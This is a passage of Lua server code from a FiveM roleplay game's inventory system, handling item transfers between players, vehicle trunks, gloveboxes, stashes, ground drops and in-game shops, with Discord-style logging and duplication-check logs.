                                TriggerEvent("aj-log:server:CreateLog", "drop", "Swapped Item", "orange", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) swapped item; name: **"..itemInfo["name"].."**, amount: **" .. toAmount .. "** with name: **" .. fromItemData.name .. "**, amount: **" .. fromAmount .. "** - dropid: *" .. toInventory .. "*")
                            end
                        else
                            TriggerEvent("aj-log:server:CreateLog", "anticheat", "Dupe log", "red", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | *"..src.."*) swapped item; name: **"..itemInfo["name"].."**, amount: **" .. toAmount .. "** with name: **" .. fromItemData.name .. "**, amount: **" .. fromAmount.. "** - dropid: *" .. toInventory .. "*")
                        end
                    else
                        local itemInfo = AJFW.Shared.Items[fromItemData.name:lower()]
                        TriggerEvent("aj-log:server:CreateLog", "drop", "Dropped Item", "red", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) dropped new item; name: **"..itemInfo["name"].."**, amount: **" .. fromAmount .. "** - dropid: *" .. toInventory .. "*")
                    end
                    local itemInfo = AJFW.Shared.Items[fromItemData.name:lower()]
                    AddToDrop(toInventory, toSlot, itemInfo["name"], fromAmount, HardStoreData.info, itemInfo["created"], HardStoreData.metadata, HardStoreData['decay'])
					TriggerClientEvent('inventory:client:UpdateOtherInventory2', src, Drops[toInventory].items)
					if itemInfo["name"] == "radio" then
                        TriggerClientEvent('Radio.Set', src, false)
                    end
                end
            end
        else
            AJFW.Functions.Notify(src, Lang:t("notify.missitem"), "error")
        end
    elseif AJFW.Shared.SplitStr(fromInventory, "-")[1] == "otherplayer" then
        local playerId = tonumber(AJFW.Shared.SplitStr(fromInventory, "-")[2])
        local OtherPlayer = AJFW.Functions.GetPlayer(playerId)
        local fromItemData = OtherPlayer.PlayerData.items[fromSlot]
        fromAmount = tonumber(fromAmount) or fromItemData.amount
        if fromItemData and fromItemData.amount >= fromAmount then
            local itemInfo = AJFW.Shared.Items[fromItemData.name:lower()]
            if toInventory == "player" or toInventory == "hotbar" then
				local HardStoreData = deep_copy(fromItemData)
                local toItemData = GetItemBySlot(src, toSlot)
				local HardStoreData2 = deep_copy(toItemData)
                RemoveItem(playerId, itemInfo["name"], fromAmount, fromSlot, true)
                TriggerClientEvent("inventory:client:CheckWeapon", OtherPlayer.PlayerData.source, fromItemData.name)
                if toItemData ~= nil then
                    itemInfo = AJFW.Shared.Items[toItemData.name:lower()]
                    local toAmount = tonumber(toAmount) ~= nil and tonumber(toAmount) or toItemData.amount
                    if toItemData.amount >= toAmount then
                        if toItemData.name ~= fromItemData.name then
                            Player.Functions.RemoveItem(toItemData.name, toAmount, toSlot, true)
                            OtherPlayer.Functions.AddItem(itemInfo["name"], toAmount, fromSlot, HardStoreData2.info, true, HardStoreData2.created, HardStoreData2.metadata, HardStoreData2['decay'])
                            TriggerEvent("aj-log:server:CreateLog", "robbing", "Swapped Item", "orange", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) swapped item; name: **"..toItemData.name.."**, amount: **" .. toAmount .. "** with item; **"..itemInfo["name"].."**, amount: **" .. toAmount .. "** from player: **".. GetPlayerName(OtherPlayer.PlayerData.source) .. "** (citizenid: *"..OtherPlayer.PlayerData.citizenid.."* | *"..OtherPlayer.PlayerData.source.."*)")
                        end
                    else
                        TriggerEvent("aj-log:server:CreateLog", "anticheat", "Dupe log", "red", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | *"..src.."*) swapped item; name: **"..itemInfo["name"].."**, amount: **" .. toAmount .. "** with name: **" .. fromItemData.name .. "**, amount: **" .. fromAmount.. "** with player: **".. GetPlayerName(OtherPlayer.PlayerData.source) .. "** (citizenid: *"..OtherPlayer.PlayerData.citizenid.."* | id: *"..OtherPlayer.PlayerData.source.."*)")
                    end
                else
                    TriggerEvent("aj-log:server:CreateLog", "robbing", "Retrieved Item", "green", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) took item; name: **"..fromItemData.name.."**, amount: **" .. fromAmount .. "** from player: **".. GetPlayerName(OtherPlayer.PlayerData.source) .. "** (citizenid: *"..OtherPlayer.PlayerData.citizenid.."* | *"..OtherPlayer.PlayerData.source.."*)")
                end
                AddItem(src, fromItemData.name, fromAmount, toSlot, HardStoreData.info, true, fromItemData["created"], HardStoreData["metadata"], HardStoreData['decay'])
				local OtherPlayer = AJFW.Functions.GetPlayer(playerId)
				TriggerClientEvent('inventory:client:UpdateOtherInventory2', src, OtherPlayer.PlayerData.items)
            else
				local HardStoreData = deep_copy(fromItemData)
                local toItemData = OtherPlayer.PlayerData.items[toSlot]
                local itemDataTest = OtherPlayer.Functions.GetItemBySlot(toSlot)
				local HardStoreData2 = deep_copy(itemDataTest)
                RemoveItem(playerId, itemInfo["name"], fromAmount, fromSlot, true)
                if toItemData ~= nil then
                    local toAmount = tonumber(toAmount) ~= nil and tonumber(toAmount) or toItemData.amount
                    if itemDataTest.amount >= toAmount then
                        if toItemData.name ~= fromItemData.name then
                            local itemInfo = AJFW.Shared.Items[toItemData.name:lower()]
                            OtherPlayer.Functions.RemoveItem(itemInfo["name"], toAmount, toSlot, true)
                            OtherPlayer.Functions.AddItem(itemInfo["name"], toAmount, fromSlot, HardStoreData2.info, true, HardStoreData2.created, HardStoreData2.metadata, HardStoreData2['decay'])
                        end
                    else
                        TriggerEvent("aj-log:server:CreateLog", "anticheat", "Dupe log", "red", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | *"..src.."*) swapped item; name: **"..itemInfo["name"].."**, amount: **" .. toAmount .. "** with name: **" .. fromItemData.name .. "**, amount: **" .. fromAmount.. "** with player: **".. GetPlayerName(OtherPlayer.PlayerData.source) .. "** (citizenid: *"..OtherPlayer.PlayerData.citizenid.."* | id: *"..OtherPlayer.PlayerData.source.."*)")
                    end
                end
                itemInfo = AJFW.Shared.Items[fromItemData.name:lower()]
                AddItem(playerId, itemInfo["name"], fromAmount, toSlot, HardStoreData.info, true, itemInfo["created"], HardStoreData["metadata"], HardStoreData['decay'])
				TriggerClientEvent('inventory:client:UpdateOtherInventory2', src, OtherPlayer.PlayerData.items)
            end
        else
            AJFW.Functions.Notify(src, Lang:t("notify.itemexist"), "error")
        end
    elseif AJFW.Shared.SplitStr(fromInventory, "-")[1] == "trunk" then
        local plate = AJFW.Shared.SplitStr(fromInventory, "-")[2]
        local fromItemData = Trunks[plate].items[fromSlot]
        fromAmount = tonumber(fromAmount) or fromItemData.amount
        if fromItemData and fromItemData.amount >= fromAmount then
            local itemInfo = AJFW.Shared.Items[fromItemData.name:lower()]
            if toInventory == "player" or toInventory == "hotbar" then
				local HardStoreData = deep_copy(fromItemData)
                local toItemData = GetItemBySlot(src, toSlot)
				local HardStoreData2 = deep_copy(toItemData)
                RemoveFromTrunk(plate, fromSlot, itemInfo["name"], fromAmount)
                if toItemData ~= nil then
                    itemInfo = AJFW.Shared.Items[toItemData.name:lower()]
                    local toAmount = tonumber(toAmount) ~= nil and tonumber(toAmount) or toItemData.amount
                    if toItemData.amount >= toAmount then
                        if toItemData.name ~= fromItemData.name then
                            Player.Functions.RemoveItem(toItemData.name, toAmount, toSlot, true)
                            AddToTrunk(plate, fromSlot, toSlot, itemInfo["name"], toAmount, HardStoreData2.info, itemInfo["created"], HardStoreData2.metadata, HardStoreData2['decay'])
							TriggerEvent("aj-log:server:CreateLog", "trunk", "Swapped Item", "orange", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) swapped item; name: **"..toItemData.name.."**, amount: **" .. toAmount .. "** with item; name: **"..itemInfo["name"].."**, amount: **" .. toAmount .. "** plate: *" .. plate .. "*")
                        else
                            TriggerEvent("aj-log:server:CreateLog", "trunk", "Stacked Item", "orange", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) stacked item; name: **"..toItemData.name.."**, amount: **" .. toAmount .. "** from plate: *" .. plate .. "*")
                        end
                    else
                        TriggerEvent("aj-log:server:CreateLog", "anticheat", "Dupe log", "red", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | *"..src.."*) swapped item; name: **"..toItemData.name.."**, amount: **" .. toAmount .. "** with name: **" .. itemInfo["name"] .. "**, amount: **" .. toAmount.. "** plate: *" .. plate .. "*")
                    end
                else
                    TriggerEvent("aj-log:server:CreateLog", "trunk", "Received Item", "green", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) received item; name: **"..fromItemData.name.."**, amount: **" .. fromAmount.. "** plate: *" .. plate .. "*")
                end
                AddItem(src, fromItemData.name, fromAmount, toSlot, HardStoreData.info, true, fromItemData["created"], HardStoreData["metadata"], HardStoreData['decay'])
				TriggerClientEvent('inventory:client:UpdateOtherInventory2', src, Trunks[plate].items)
            else
				local HardStoreData = deep_copy(fromItemData)
                local toItemData = Trunks[plate].items[toSlot]
				local HardStoreData2 = deep_copy(toItemData)
                RemoveFromTrunk(plate, fromSlot, itemInfo["name"], fromAmount)
                if toItemData ~= nil then
                    local toAmount = tonumber(toAmount) ~= nil and tonumber(toAmount) or toItemData.amount
                    if toItemData.amount >= toAmount then
                        if toItemData.name ~= fromItemData.name then
                            local itemInfo = AJFW.Shared.Items[toItemData.name:lower()]
                            RemoveFromTrunk(plate, toSlot, itemInfo["name"], toAmount)
                            AddToTrunk(plate, fromSlot, toSlot, itemInfo["name"], toAmount, HardStoreData2.info, itemInfo["created"], HardStoreData2.metadata, HardStoreData2['decay'])
						end
                    else
                        TriggerEvent("aj-log:server:CreateLog", "anticheat", "Dupe log", "red", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | *"..src.."*) swapped item; name: **"..toItemData.name.."**, amount: **" .. toAmount .. "** with name: **" .. itemInfo["name"] .. "**, amount: **" .. toAmount.. "** plate: *" .. plate .. "*")
                    end
                end
                itemInfo = AJFW.Shared.Items[fromItemData.name:lower()]
                AddToTrunk(plate, toSlot, fromSlot, itemInfo["name"], fromAmount, HardStoreData.info, itemInfo["created"], HardStoreData.metadata, HardStoreData['decay'])
				TriggerClientEvent('inventory:client:UpdateOtherInventory2', src, Trunks[plate].items)
			end
        else
            AJFW.Functions.Notify(src, Lang:t("notify.itemexist"), "error")
        end
    elseif AJFW.Shared.SplitStr(fromInventory, "-")[1] == "glovebox" then
        local plate = AJFW.Shared.SplitStr(fromInventory, "-")[2]
        local fromItemData = Gloveboxes[plate].items[fromSlot]
        fromAmount = tonumber(fromAmount) or fromItemData.amount
        if fromItemData and fromItemData.amount >= fromAmount then
            local itemInfo = AJFW.Shared.Items[fromItemData.name:lower()]
            if toInventory == "player" or toInventory == "hotbar" then
				local HardStoreData = deep_copy(fromItemData)
                local toItemData = GetItemBySlot(src, toSlot)
				local HardStoreData2 = deep_copy(toItemData)
                RemoveFromGlovebox(plate, fromSlot, itemInfo["name"], fromAmount)
                if toItemData ~= nil then
                    itemInfo = AJFW.Shared.Items[toItemData.name:lower()]
                    local toAmount = tonumber(toAmount) ~= nil and tonumber(toAmount) or toItemData.amount
                    if toItemData.amount >= toAmount then
                        if toItemData.name ~= fromItemData.name then
                            Player.Functions.RemoveItem(toItemData.name, toAmount, toSlot, true)
                            AddToGlovebox(plate, fromSlot, toSlot, itemInfo["name"], toAmount, HardStoreData2.info, itemInfo["created"], HardStoreData2.metadata, HardStoreData2['decay'])
                            TriggerEvent("aj-log:server:CreateLog", "glovebox", "Swapped", "orange", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src..")* swapped item; name: **"..toItemData.name.."**, amount: **" .. toAmount .. "** with item; name: **"..itemInfo["name"].."**, amount: **" .. toAmount .. "** plate: *" .. plate .. "*")
                        else
                            TriggerEvent("aj-log:server:CreateLog", "glovebox", "Stacked Item", "orange", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) stacked item; name: **"..toItemData.name.."**, amount: **" .. toAmount .. "** from plate: *" .. plate .. "*")
                        end
                    else
                        TriggerEvent("aj-log:server:CreateLog", "anticheat", "Dupe log", "red", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | *"..src.."*) swapped item; name: **"..toItemData.name.."**, amount: **" .. toAmount .. "** with name: **" .. itemInfo["name"] .. "**, amount: **" .. toAmount.. "** plate: *" .. plate .. "*")
                    end
                else
                    TriggerEvent("aj-log:server:CreateLog", "glovebox", "Received Item", "green", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) received item; name: **"..fromItemData.name.."**, amount: **" .. fromAmount.. "** plate: *" .. plate .. "*")
                end
                AddItem(src, fromItemData.name, fromAmount, toSlot, HardStoreData.info, true, fromItemData["created"], HardStoreData["metadata"], HardStoreData['decay'])
				TriggerClientEvent('inventory:client:UpdateOtherInventory2', src, Gloveboxes[plate].items)
            else
				local HardStoreData = deep_copy(fromItemData)
                local toItemData = Gloveboxes[plate].items[toSlot]
				local HardStoreData2 = deep_copy(toItemData)
                RemoveFromGlovebox(plate, fromSlot, itemInfo["name"], fromAmount)
                if toItemData ~= nil then
                    local toAmount = tonumber(toAmount) ~= nil and tonumber(toAmount) or toItemData.amount
                    if toItemData.amount >= toAmount then
                        if toItemData.name ~= fromItemData.name then
                            local itemInfo = AJFW.Shared.Items[toItemData.name:lower()]
                            RemoveFromGlovebox(plate, toSlot, itemInfo["name"], toAmount)
                            AddToGlovebox(plate, fromSlot, toSlot, itemInfo["name"], toAmount, HardStoreData2.info, itemInfo["created"], HardStoreData2.metadata, HardStoreData2['decay'])
                        end
                    else
                        TriggerEvent("aj-log:server:CreateLog", "anticheat", "Dupe log", "red", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | *"..src.."*) swapped item; name: **"..toItemData.name.."**, amount: **" .. toAmount .. "** with name: **" .. itemInfo["name"] .. "**, amount: **" .. toAmount.. "** plate: *" .. plate .. "*")
                    end
                end
                itemInfo = AJFW.Shared.Items[fromItemData.name:lower()]
                AddToGlovebox(plate, toSlot, fromSlot, itemInfo["name"], fromAmount, HardStoreData.info, itemInfo["created"], HardStoreData.metadata, HardStoreData['decay'])
				TriggerClientEvent('inventory:client:UpdateOtherInventory2', src, Gloveboxes[plate].items)
            end
        else
            AJFW.Functions.Notify(src, Lang:t("notify.itemexist"), "error")
        end
    elseif AJFW.Shared.SplitStr(fromInventory, "-")[1] == "stash" then
        local stashId = AJFW.Shared.SplitStr(fromInventory, "-")[2]
        local fromItemData = Stashes[stashId].items[fromSlot]
        fromAmount = tonumber(fromAmount) or fromItemData.amount
        if fromItemData and fromItemData.amount >= fromAmount then
            local itemInfo = AJFW.Shared.Items[fromItemData.name:lower()]
            if toInventory == "player" or toInventory == "hotbar" then
				local HardStoreData = deep_copy(fromItemData)
                local toItemData = GetItemBySlot(src, toSlot)
				local HardStoreData2 = deep_copy(toItemData)
                RemoveFromStash(stashId, fromSlot, itemInfo["name"], fromAmount)
                if toItemData ~= nil then
                    itemInfo = AJFW.Shared.Items[toItemData.name:lower()]
                    local toAmount = tonumber(toAmount) ~= nil and tonumber(toAmount) or toItemData.amount
                    if toItemData.amount >= toAmount then
                        if toItemData.name ~= fromItemData.name then
                            Player.Functions.RemoveItem(toItemData.name, toAmount, toSlot, true)
                            AddToStash(stashId, fromSlot, toSlot, itemInfo["name"], toAmount, HardStoreData2.info, itemInfo["created"], HardStoreData2.metadata, HardStoreData2['decay'])
                            TriggerEvent("aj-log:server:CreateLog", "stash", "Swapped Item", "orange", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) swapped item; name: **"..toItemData.name.."**, amount: **" .. toAmount .. "** with item; name: **"..fromItemData.name.."**, amount: **" .. fromAmount .. "** stash: *" .. stashId .. "*")
                        else
                            TriggerEvent("aj-log:server:CreateLog", "stash", "Stacked Item", "orange", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) stacked item; name: **"..toItemData.name.."**, amount: **" .. toAmount .. "** from stash: *" .. stashId .. "*")
                        end
                    else
                        TriggerEvent("aj-log:server:CreateLog", "anticheat", "Dupe log", "red", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) swapped item; name: **"..toItemData.name.."**, amount: **" .. toAmount .. "** with item; name: **"..fromItemData.name.."**, amount: **" .. fromAmount .. "** stash: *" .. stashId .. "*")
                    end
                else
                    TriggerEvent("aj-log:server:CreateLog", "stash", "Received Item", "green", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) received item; name: **"..fromItemData.name.."**, amount: **" .. fromAmount.. "** stash: *" .. stashId .. "*")
                end
                SaveStashItems(stashId, Stashes[stashId].items)
                AddItem(src, fromItemData.name, fromAmount, toSlot, HardStoreData.info, true, fromItemData["created"], HardStoreData["metadata"], HardStoreData['decay'])
				TriggerClientEvent('inventory:client:UpdateOtherInventory2', src, Stashes[stashId].items)
            else
				local HardStoreData = deep_copy(fromItemData)
                local toItemData = Stashes[stashId].items[toSlot]
				local HardStoreData2 = deep_copy(toItemData)
                RemoveFromStash(stashId, fromSlot, itemInfo["name"], fromAmount)
                if toItemData ~= nil then
                    local toAmount = tonumber(toAmount) ~= nil and tonumber(toAmount) or toItemData.amount
                    if toItemData.amount >= toAmount then
                        if toItemData.name ~= fromItemData.name then
                            local itemInfo = AJFW.Shared.Items[toItemData.name:lower()]
                            RemoveFromStash(stashId, toSlot, itemInfo["name"], toAmount)
                            AddToStash(stashId, fromSlot, toSlot, itemInfo["name"], toAmount, HardStoreData2.info, itemInfo["created"], HardStoreData2.metadata, HardStoreData2['decay'])
                        end
                    else
                        TriggerEvent("aj-log:server:CreateLog", "anticheat", "Dupe log", "red", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) swapped item; name: **"..toItemData.name.."**, amount: **" .. toAmount .. "** with item; name: **"..fromItemData.name.."**, amount: **" .. fromAmount .. "** stash: *" .. stashId .. "*")
                    end
                end
                itemInfo = AJFW.Shared.Items[fromItemData.name:lower()]
				
                AddToStash(stashId, toSlot, fromSlot, itemInfo["name"], fromAmount, HardStoreData.info, itemInfo["created"], HardStoreData.metadata, HardStoreData['decay'])
				TriggerClientEvent('inventory:client:UpdateOtherInventory2', src, Stashes[stashId].items)
            end
        else
            AJFW.Functions.Notify(src, Lang:t("notify.itemexist"), "error")
        end

    elseif AJFW.Shared.SplitStr(fromInventory, "-")[1] == "itemshop" then
        local shopType = AJFW.Shared.SplitStr(fromInventory, "-")[2]
        local itemData = ShopItems[shopType].items[fromSlot]
        local itemInfo = AJFW.Shared.Items[itemData.name:lower()]
        local bankBalance = Player.PlayerData.money["bank"]
        local price = tonumber((itemData.price*fromAmount))

        if AJFW.Shared.SplitStr(shopType, "_")[1] == "Dealer" then
            if AJFW.Shared.SplitStr(itemData.name, "_")[1] == "weapon" then
                price = tonumber(itemData.price)
                if Player.Functions.RemoveMoney("cash", price, "dealer-item-bought") then
                    itemData.info.serie = tostring(AJFW.Shared.RandomInt(2) .. AJFW.Shared.RandomStr(3) .. AJFW.Shared.RandomInt(1) .. AJFW.Shared.RandomStr(2) .. AJFW.Shared.RandomInt(3) .. AJFW.Shared.RandomStr(4))
                    itemData.info.quality = 100
                    AddItem(src, itemData.name, 1, toSlot, itemData.info)
                    TriggerClientEvent('aj-drugs:client:updateDealerItems', src, itemData, 1)
                    AJFW.Functions.Notify(src, itemInfo["label"] .. " bought!", "success")
                    TriggerEvent("aj-log:server:CreateLog", "dealers", "Dealer item bought", "green", "**"..GetPlayerName(src) .. "** bought a " .. itemInfo["label"] .. " for $"..price)
                else
					TriggerClientEvent("aj-inventory:client:closeinv", src)
					AJFW.Functions.Notify(src, Lang:t("notify.notencash"), "error")
                end
            else
                if Player.Functions.RemoveMoney("cash", price, "dealer-item-bought") then
                    AddItem(src, itemData.name, fromAmount, toSlot, itemData.info)
                    TriggerClientEvent('aj-drugs:client:updateDealerItems', src, itemData, fromAmount)
                    AJFW.Functions.Notify(src, itemInfo["label"] .. " bought!", "success")
                    TriggerEvent("aj-log:server:CreateLog", "dealers", "Dealer item bought", "green", "**"..GetPlayerName(src) .. "** bought a " .. itemInfo["label"] .. "  for $"..price)
                else
					TriggerClientEvent("aj-inventory:client:closeinv", src)
					AJFW.Functions.Notify(src, "You don't have enough cash..", "error")
                end
            end
        elseif AJFW.Shared.SplitStr(shopType, "_")[1] == "Itemshop" then
            if Player.Functions.RemoveMoney("cash", price, "itemshop-bought-item") then
                if AJFW.Shared.SplitStr(itemData.name, "_")[1] == "weapon" then
                    itemData.info.serie = tostring(AJFW.Shared.RandomInt(2) .. AJFW.Shared.RandomStr(3) .. AJFW.Shared.RandomInt(1) .. AJFW.Shared.RandomStr(2) .. AJFW.Shared.RandomInt(3) .. AJFW.Shared.RandomStr(4))
                end
                local serial = itemData.info.serie
                local imageurl = ("https://cfx-nui-"..Config.ImageResource.."%s.png"):format(itemData.name)
                local notes = "Purchased at Ammunation"
                local owner = Player.PlayerData.charinfo.firstname .. " " .. Player.PlayerData.charinfo.lastname
                local weapClass = 1
                local weapModel = AJFW.Shared.Items[itemData.name].label
                AddItem(src, itemData.name, fromAmount, toSlot, itemData.info, true)
                TriggerClientEvent('aj-shops:client:UpdateShop', src, AJFW.Shared.SplitStr(shopType, "_")[2], itemData, fromAmount)
                AJFW.Functions.Notify(src, itemInfo["label"] .. " bought!", "success")
                exports['aj-mdt']:CreateWeaponInfo(serial, imageurl, notes, owner, weapClass, weapModel)
                TriggerEvent("aj-log:server:CreateLog", "shops", "Shop item bought", "green", "**"..GetPlayerName(src) .. "** bought a " .. itemInfo["label"] .. " for $"..price)
            elseif bankBalance >= price then
                Player.Functions.RemoveMoney("bank", price, "itemshop-bought-item")
                if AJFW.Shared.SplitStr(itemData.name, "_")[1] == "weapon" then
                    itemData.info.serie = tostring(AJFW.Shared.RandomInt(2) .. AJFW.Shared.RandomStr(3) .. AJFW.Shared.RandomInt(1) .. AJFW.Shared.RandomStr(2) .. AJFW.Shared.RandomInt(3) .. AJFW.Shared.RandomStr(4))
                end
                local serial = itemData.info.serie
                local imageurl = ("https://cfx-nui-"..Config.ImageResource.."%s.png"):format(itemData.name)
                local notes = "Purchased at Ammunation"
                local owner = Player.PlayerData.charinfo.firstname .. " " .. Player.PlayerData.charinfo.lastname
                local weapClass = 1
                local weapModel = AJFW.Shared.Items[itemData.name].label
                AddItem(src, itemData.name, fromAmount, toSlot, itemData.info, true)
                TriggerClientEvent('aj-shops:client:UpdateShop', src, AJFW.Shared.SplitStr(shopType, "_")[2], itemData, fromAmount)
                AJFW.Functions.Notify(src, itemInfo["label"] .. " bought!", "success")
				exports['aj-mdt']:CreateWeaponInfo(serial, imageurl, notes, owner, weapClass, weapModel)
                TriggerEvent("aj-log:server:CreateLog", "shops", "Shop item bought", "green", "**"..GetPlayerName(src) .. "** bought a " .. itemInfo["label"] .. " for $"..price)
            else
				TriggerClientEvent("aj-inventory:client:closeinv", src)
                AJFW.Functions.Notify(src, "You don't have enough cash..", "error")
            end
        else
            if Player.Functions.RemoveMoney("cash", price, "unkown-itemshop-bought-item") then
                AddItem(src, itemData.name, fromAmount, toSlot, itemData.info, true)
                AJFW.Functions.Notify(src, itemInfo["label"] .. " bought!", "success")
                TriggerEvent("aj-log:server:CreateLog", "shops", "Shop item bought", "green", "**"..GetPlayerName(src) .. "** bought a " .. itemInfo["label"] .. " for $"..price)
            elseif bankBalance >= price then
                Player.Functions.RemoveMoney("bank", price, "unkown-itemshop-bought-item")
                AddItem(src, itemData.name, fromAmount, toSlot, itemData.info, true)
                AJFW.Functions.Notify(src, itemInfo["label"] .. " bought!", "success")
                TriggerEvent("aj-log:server:CreateLog", "shops", "Shop item bought", "green", "**"..GetPlayerName(src) .. "** bought a " .. itemInfo["label"] .. " for $"..price)
            else
				TriggerClientEvent("aj-inventory:client:closeinv", src)
                AJFW.Functions.Notify(src, Lang:t("notify.notencash"), "error")
            end
        end
    else
		-- drop
        fromInventory = tonumber(fromInventory)
        local fromItemData = Drops[fromInventory].items[fromSlot]
        fromAmount = tonumber(fromAmount) or fromItemData.amount
        if fromItemData and fromItemData.amount >= fromAmount then
            local itemInfo = AJFW.Shared.Items[fromItemData.name:lower()]
            if toInventory == "player" or toInventory == "hotbar" then
				local HardStoreData = deep_copy(fromItemData)
                local toItemData = GetItemBySlot(src, toSlot)
				local HardStoreData2 = deep_copy(toItemData)
                RemoveFromDrop(fromInventory, fromSlot, itemInfo["name"], fromAmount)
                if toItemData ~= nil then
                    toAmount = tonumber(toAmount) and tonumber(toAmount) or toItemData.amount
                    if toItemData.amount >= toAmount then
                        if toItemData.name ~= fromItemData.name then
                            itemInfo = AJFW.Shared.Items[toItemData.name:lower()]
                            Player.Functions.RemoveItem(toItemData.name, toAmount, toSlot, true)
                            AddToDrop(fromInventory, fromSlot, itemInfo["name"], toAmount, HardStoreData2.info, itemInfo["created"], HardStoreData2.metadata, HardStoreData2['decay'])
                            if itemInfo["name"] == "radio" then
                                TriggerClientEvent('Radio.Set', src, false)
                            end
                            TriggerEvent("aj-log:server:CreateLog", "drop", "Swapped Item", "orange", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) swapped item; name: **"..toItemData.name.."**, amount: **" .. toAmount .. "** with item; name: **"..fromItemData.name.."**, amount: **" .. fromAmount .. "** - dropid: *" .. fromInventory .. "*")
                        else
                            TriggerEvent("aj-log:server:CreateLog", "drop", "Stacked Item", "orange", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) stacked item; name: **"..toItemData.name.."**, amount: **" .. toAmount .. "** - from dropid: *" .. fromInventory .. "*")
                        end
                    else
                        TriggerEvent("aj-log:server:CreateLog", "anticheat", "Dupe log", "red", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) swapped item; name: **"..toItemData.name.."**, amount: **" .. toAmount .. "** with item; name: **"..fromItemData.name.."**, amount: **" .. fromAmount .. "** - dropid: *" .. fromInventory .. "*")
                    end
                else
                    TriggerEvent("aj-log:server:CreateLog", "drop", "Received Item", "green", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) received item; name: **"..fromItemData.name.."**, amount: **" .. fromAmount.. "** -  dropid: *" .. fromInventory .. "*")
                end
                AddItem(src, fromItemData.name, fromAmount, toSlot, HardStoreData.info, true, fromItemData["created"], HardStoreData.metadata, HardStoreData['decay'])
				TriggerClientEvent('inventory:client:UpdateOtherInventory2', src, Drops[fromInventory].items)
			else
                toInventory = tonumber(toInventory)
				local HardStoreData = deep_copy(fromItemData)
                local toItemData = Drops[toInventory].items[toSlot]
				local HardStoreData2 = deep_copy(toItemData)
                RemoveFromDrop(fromInventory, fromSlot, itemInfo["name"], fromAmount)
                if toItemData ~= nil then
                    local toAmount = tonumber(toAmount) ~= nil and tonumber(toAmount) or toItemData.amount
                    if toItemData.amount >= toAmount then
                        if toItemData.name ~= fromItemData.name then
                            local itemInfo = AJFW.Shared.Items[toItemData.name:lower()]
                            RemoveFromDrop(toInventory, toSlot, itemInfo["name"], toAmount)
                            AddToDrop(fromInventory, fromSlot, itemInfo["name"], toAmount, HardStoreData2.info, itemInfo["created"], HardStoreData2.metadata, HardStoreData2['decay'])
                            if itemInfo["name"] == "radio" then
                                TriggerClientEvent('Radio.Set', src, false)
                            end
                        end
                    else
                        TriggerEvent("aj-log:server:CreateLog", "anticheat", "Dupe log", "red", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) swapped item; name: **"..toItemData.name.."**, amount: **" .. toAmount .. "** with item; name: **"..fromItemData.name.."**, amount: **" .. fromAmount .. "** - dropid: *" .. fromInventory .. "*")
                    end
                 end
                itemInfo = AJFW.Shared.Items[fromItemData.name:lower()]
                AddToDrop(toInventory, toSlot, itemInfo["name"], fromAmount, HardStoreData.info, itemInfo["created"], HardStoreData.metadata, HardStoreData['decay'])
				TriggerClientEvent('inventory:client:UpdateOtherInventory2', src, Drops[fromInventory].items)
                if itemInfo["name"] == "radio" then
                    TriggerClientEvent('Radio.Set', src, false)
                end
            end
        else
            AJFW.Functions.Notify(src, "Item doesn't exist??", "error")
        end
    end
end)

RegisterServerEvent("inventory:server:GiveItem", function(target, name, amount, slot)
    local src = source
    local Player = AJFW.Functions.GetPlayer(src)
	target = tonumber(target)
    local OtherPlayer = AJFW.Functions.GetPlayer(target)
    local dist = #(GetEntityCoords(GetPlayerPed(src))-GetEntityCoords(GetPlayerPed(target)))
	if Player == OtherPlayer then return AJFW.Functions.Notify(src, Lang:t("notify.gsitem")) end
	if dist > 2 then return AJFW.Functions.Notify(src, Lang:t("notify.tftgitem")) end
	local item = GetItemBySlot(src, slot)
	if not item then AJFW.Functions.Notify(src, Lang:t("notify.infound")); return end
	if item.name ~= name then AJFW.Functions.Notify(src, Lang:t("notify.iifound")); return end

	if amount <= item.amount then
		if amount == 0 then
			amount = item.amount
		end
		if RemoveItem(src, item.name, amount, item.slot, true) then
